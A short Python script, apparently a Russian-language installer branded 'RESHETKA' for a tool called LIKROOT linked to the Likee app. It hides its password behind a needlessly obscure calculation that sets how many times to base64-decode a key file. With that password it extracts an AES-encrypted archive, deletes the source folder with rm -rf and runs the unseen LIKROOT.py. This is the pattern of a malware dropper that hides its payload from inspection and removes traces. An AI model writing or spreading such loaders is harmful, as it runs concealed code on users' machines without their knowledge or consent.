#RESHETKA NEW 2025

import time
import os
import base64
import math

likroot = (10**(math.log10(10000)) / (math.sqrt(100)*5)) * (5 / (5**0))
sys = (f"{likroot:.0f}")
gps = (int(sys)-980)

logo = """
╭╮╱╱╭━━┳╮╭━┳━━━┳━━━┳━━━┳━━━━╮
┃┃╱╱╰┫┣┫┃┃╭┫╭━╮┃╭━╮┃╭━╮┃╭╮╭╮┃
┃┃╱╱╱┃┃┃╰╯╯┃╰━╯┃┃╱┃┃┃╱┃┣╯┃┃╰╯
┃┃╱╭╮┃┃┃╭╮┃┃╭╮╭┫┃╱┃┃┃╱┃┃╱┃┃
┃╰━╯┣┫┣┫┃┃╰┫┃┃╰┫╰━╯┃╰━╯┃╱┃┃
╰━━━┻━━┻╯╰━┻╯╰━┻━━━┻━━━╯╱╰╯
"""
try:
    import pyzipper
except:
    print ("Ожидайте. Установка pyzipper,,,")
    os.system("pip install pyzipper==0.3.6")
    os.system("clear")
    import pyzipper

menu = f"""
{logo}

Developer> RESHETKA
Likee ID> @FEDERAL_OSINT

1. Установить LIKROOT
2. Выход
"""
print (menu)
print ("")
user = input("Выбирай>")

if user == "1":
    os.system("reset")
    print ("Создание сессии")
    os.system("touch session")
    print ("Установка LIKROOT...")
    lik = open('keysoft','r')
    content = lik.read()
    lik.close()
    
    for i in range(gps):
        likee = base64.b64decode(content).decode('utf-8')
        content = (likee)
    likroot = 'likee/LIK.zip'
    pwd = (content)
    with pyzipper.AESZipFile(likroot) as z:
        z.setpassword(pwd.encode())
        z.extractall()
    os.system("rm -rf likee")
    time.sleep(1)
    os.system("python3 LIKROOT.py")
    exit()

else:
    exit()
    
    


    


